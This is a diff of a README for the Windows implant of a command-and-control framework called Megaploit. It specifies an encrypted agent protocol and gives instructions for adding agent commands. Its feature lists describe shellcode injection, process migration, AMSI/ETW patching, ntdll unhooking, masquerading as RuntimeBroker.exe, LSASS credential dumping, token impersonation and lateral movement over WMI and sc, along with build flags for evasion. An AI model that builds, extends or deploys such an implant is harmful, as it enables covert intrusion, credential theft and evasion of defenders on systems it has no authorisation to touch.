+| `SECRET_KEY_PATH` | `"secret.key"` | Relative filename of the HMAC key file |
+| `SECRET_KEY_LEN` | `32` | Decoded key length in bytes (file holds 64 hex chars) |
+| `SHELL_LINE_BUF` | `4096` | `fgets()` line buffer for `_popen` output |
+| `SHELL_RESP_BUF` | `65536` | Initial accumulated response buffer (grows dynamically) |
+| `INJECT_MAX_SHELLCODE` | `32768` | Maximum shellcode bytes accepted by `inject` verb |
+| `PS_MAX_PROCS` | `512` | Maximum processes listed by `ps` before truncation |
+
+**Secret key format:** The file must contain exactly 64 ASCII hex characters
+(lower or upper case, with or without a trailing newline). Generate with:
+
+```python
+python -c "import os,binascii; open('secret.key','wb').write(binascii.hexlify(os.urandom(32)))"
+```
+
+The same file must be loaded by the Megaploit server (`megaploit/core/crypto.py`).
 
 ---
 
 ## Protocol Wire Format
 
+All application data flows through four nested layers (innermost first):
+
+### Layer 4 — AES-256-GCM frame
+
 ```
-Every message (text or file):
+Outbound message:
+  [uint32-BE  total_len      ]   4 bytes  — length of the rest
+  [byte[12]   nonce          ]  12 bytes  — random, fresh per message
+  [byte[N]    ciphertext     ]   N bytes  — AES-256-GCM(seq_be64 ++ plaintext)
+  [byte[16]   GCM auth tag   ]  16 bytes
 
-  ┌──────────────────────────────────────────────────────────────┐
-  │  4 bytes   │  12 bytes  │  N bytes ciphertext + 16-byte tag │
-  │ uint32-BE  │ GCM nonce  │  AES-256-GCM(seq_be64 ++ data)   │
-  │   length   │            │                                    │
-  └──────────────────────────────────────────────────────────────┘
-
-  Plaintext before encryption:
-    [uint64-BE sequence number (8 bytes)] [data bytes]
-
-  File download (agent → C2):
-    1. agent sends text message: "FILE_OK"
-    2. agent sends file frame:   [uint32-BE len][nonce][AES-GCM(seq ++ file bytes)]
-
-  File upload (C2 → agent):
-    1. C2 sends text message: "upload <filename>"
-    2. C2 sends file frame:   [uint32-BE len][nonce][AES-GCM(seq ++ file bytes)]
+Inbound: identical layout.
+Sequence number: prepended to plaintext before encryption as a big-endian
+uint64. Receiver enforces seq > last_seq (strict monotonicity = replay protection).
 ```
 
-Replay protection: each side maintains a monotonic `uint64` sequence counter.
-Received messages whose sequence number is not strictly greater than the last
-accepted one are dropped.
+### Layer 3 — Protocol v2 handshake
+
+```
+Server → 0x4d  ('M')
+Client → 0x4d  (echo)
+```
+
+### Layer 2 — HMAC-SHA256 authentication
+
+```
+Server → 16 random bytes  (challenge)
+Client → HMAC-SHA256(secret_key[32], challenge[16])  = 32 bytes
+Server drops connection if response does not match.
+```
+
+### Layer 1 — TLS 1.2 / 1.3
+
+SChannel with `SP_PROT_TLS1_2_CLIENT | SP_PROT_TLS1_3_CLIENT`,
+`SCH_USE_STRONG_CRYPTO`, `ISC_REQ_NO_RENEGOTIATION`.
 
 ---
 
-## What Changed from the Original
+## What Changed
 
-See [`CHANGELOG.md`](CHANGELOG.md) for the full log.
+### Refactor — source split
 
-### New features (added in this fork)
+The original codebase was a single monolithic `Source.c` (~2 000 lines).
+The current layout splits it by responsibility:
 
-| Feature | Files |
-|---------|-------|
-| `ls` — native directory listing with sizes + timestamps | `client/shell.c` |
-| `ps` — process list with arch + owner (via `LookupAccountSid`) | `client/shell.c` |
-| `inject <pid> <hex>` — NT-native shellcode injection (W^X, HideFromDebugger) | `client/inject.h/c` |
-| `migrate <pid>` — reflective agent migration via LoadLibraryA bootstrap | `client/inject.h/c` |
-| BCrypt AES-256-GCM key handle cache — ~10× faster per-message crypto | `tls/tls_client.h/c` |
-| MSVC + MinGW size/evasion build flags (dead-code strip, symbol strip, no console alloc) | `Makefile` |
+| Old | New |
+|---|---|
+| `Source.c` (everything) | `main.c` + `spoof.c` + `shell.c` + `handlers_*.c` + `inject.c` + `evasion.c` + `ntcalls.c` |
+| Inline spoof functions in `main.c` | `client/spoof.c` / `client/spoof.h` |
+| All handler bodies in `shell.c` | `handlers_system.c`, `handlers_ui.c`, `handlers_lateral.c` |
+
+### New features
+
+- **`spoof.c`** — PEB user-mode field overwrite + `NtSetInformationProcess(49)`
+  kernel image name spoof (visible in Process Hacker "Image" column)
+- **`evasion.c`** — `unhook_ntdll`, `etw_patch`, `amsi_patch`
+- **`auto_migrate`** — copies self to `%TEMP%\RuntimeBroker.exe` and relaunches
+  before the C2 connect loop; original process exits
+- **`obfuscate_sleep`** — XOR-scrambles in-memory RX pages during reconnect delays
+- **`dump_lsass`** — `MiniDumpWriteDump` via dynamically loaded `dbghelp.dll`
+- **`token_impersonate`** — `OpenProcessToken` + `DuplicateTokenEx` + `ImpersonateLoggedOnUser`
+- **`lateral_wmi`** — remote exec via `wmic /node Win32_Process.Create`
+- **`lateral_sc`** — remote exec via `sc create/start/delete` (SYSTEM on target)
+- **`idle_time`**, **`lock_screen`**, **`active_windows`** — new UI/recon verbs
+- **`getclip`** / **`setclip`** — clipboard read/write
+- **`msgbox`** — detached `mshta.exe` dialog (no parent link in Task Manager)
+- **Reflective loader** — `client/loader.c` + `gen_loader_blob.ps1` pipeline
 
 ### Bug fixes (vs original `Source.c`)
 
-| Bug | Fix |
-|-----|-----|
-| `CreateMutexA` passed wide-string literal `L"consoleShell"` | Narrow string literal |
-| `WSAStartup(MAKEWORD(2,0))` — requested Winsock 2.0 | `MAKEWORD(2,2)` |
-| `inet_addr()` deprecated, returns `INADDR_NONE` for `255.255.255.255` | `InetPtonA()` |
-| Socket leaked on `connect()` failure (`WSAETIMEDOUT`) | Socket recreated on every retry |
-| `SecureZeroMemory(secretKey)` was dead code (inside `while(1)` after infinite loop logic) | Wipe immediately after `tls_connect()` copies it |
-| `AllocConsole()` + `ShowWindow(SW_HIDE)` — suspicious AV heuristic | Removed; GUI subsystem means OS never allocates a console |
-| `forceOff()` `strncmp` length `11` → `10` | Fixed |
-| `fclose()` on `_popen()` handle | `_pclose()` |
-| NT status check inverted (`if (status) return;` meant "exit on success") | Inverted condition |
-| Empty `_popen()` output sent zero bytes (recv blocked) | Single-space sentinel sent instead |
-| 1024-byte `sysinfo` buffer too small | 4 KB |
+| # | Bug | Fix |
+|---|---|---|
+| 1 | `checkNtCalls()` return logic backwards — `if (!ntcalls_load()) continue` treated failure as success | Inverted condition |
+| 2 | `CreateMutexA` passed a wide-string literal (UB under `-DUNICODE`) | Changed to `CreateMutexA(NULL, FALSE, "consoleShell")` |
+| 3 | `WSAStartup(MAKEWORD(2, 0), ...)` requested Winsock 2.0 | Changed to `MAKEWORD(2, 2)` |
+| 4 | `fclose()` called on a `_popen()` handle (UB — must use `_pclose`) | Fixed to `_pclose` |
+| 5 | `forceOff()` `strncmp` length was `11` (one byte short, matched `forceOff(` without `)`) | Changed to `10` |
+| 6 | Empty response frame (`tls_send_msg("", 0)`) blocked the server reader | Now sends a single space instead of zero bytes |
 
-### Server bug fixes (vs original `serverShell.c`)
+### Bug fixes (vs original `serverShell.c`)
 
-| Bug | Fix |
-|-----|-----|
-| `sin_addr.s_addr` never assigned — bind address undefined | Assigned `INADDR_ANY` |
-| `forceOff()` `strncmp` length `12` → `10` | Fixed |
-| Dangling `else` caused `blueScreen()` to fall into `recv()` | Braces added |
-| `write()` sent full 1024-byte buffer regardless of `strlen` | Fixed to use `strlen` |
-| `socket()` and `accept()` return values unchecked | Both now checked |
+| # | Bug | Fix |
+|---|---|---|
+| 1 | `sAddress.sin_addr.s_addr` never assigned — socket bound to 0.0.0.0 regardless of `-h` flag | Added `inet_pton` assignment |
+| 2 | `forceOff()` `strncmp` length was `12` | Changed to `10` |
+| 3 | Dangling `else` caused `blueScreen()` branch to fall through and call `recv()` | Added braces |
+| 4 | `write()` sent full 1024-byte buffer including NUL padding | Changed to `write(fd, buf, strlen(buf))` |
+| 5 | `socket()` and `accept()` return values unchecked | Added checks |
+| 6 | `write()` / `recv()` return values unchecked | Added checks |
+| 7 | Listening socket never closed | Added `close(listenSock)` after `accept()` |
+| 8 | Unreachable `jmp:` label after `return` | Removed |
 
 ---
 
-## Adding a New C-Exclusive Command
+## Adding a New Command
 
-1. Implement a handler function in `client/shell.c`:
-   ```c
-   static void _handle_reboot(TLS_CONTEXT *pTls) {
-       // ... implementation ...
-       _send_str(pTls, "[+] rebooting");
-   }
-   ```
+1. **Pick a file** — system/recon verb → `handlers_system.c`,
+   UI/file verb → `handlers_ui.c`, lateral/cred verb → `handlers_lateral.c`,
+   or keep it inline in `shell.c` for trivial one-liners.
 
-2. Add a dispatch branch before the shell fallback:
-   ```c
-   if (cbCmd >= 8 && strncmp("reboot()", cmd, 8) == 0) {
-       free(pCmd); pCmd = NULL;
-       _handle_reboot(pTls);
-       continue;
-   }
-   ```
+2. **Write the handler:**
 
-3. That's it. `megaploit/core/c_probe.py` detects the `strncmp("reboot()", ...)` call
-   at the next server start and `commands.py` auto-registers the `reboot` operator command.
-   No Python changes needed.
+```c
+// handlers_system.c (for example)
+void _handle_myverb(TLS_CONTEXT *pTls, const char *args)
+{
+    // ... do work ...
+    _send_str(pTls, "[+] result");
+}
+```
 
----
+3. **Declare it in `shell_internal.h`:**
 
-*Part of the [Megaploit](https://github.com/Josefifir/Megaploit) C2 framework.*
+```c
+void _handle_myverb(TLS_CONTEXT *pTls, const char *args);
+```
+
+4. **Add a dispatch branch in `shell.c`** inside `shell_run()`:
+
+```c
+if (cbCmd >= 8 && strncmp("myverb ", cmd, 7) == 0) {
+    char args[256] = {0};
+    strncpy(args, cmd + 7, sizeof(args) - 1);
+    free(pCmd); pCmd = NULL;
+    _handle_myverb(pTls, args);
+    continue;
+}
+```
+
+5. **Build and test:**
+
+```powershell
+mingw32-make C2_IP=192.168.1.226 C2_PORT=50005
+```
+
+No other files need to change. The Megaploit C2 probe (`megaploit/core/c_probe.py`)
+discovers new verbs automatically by scanning the `strncmp()` calls in the
+compiled binary at runtime.
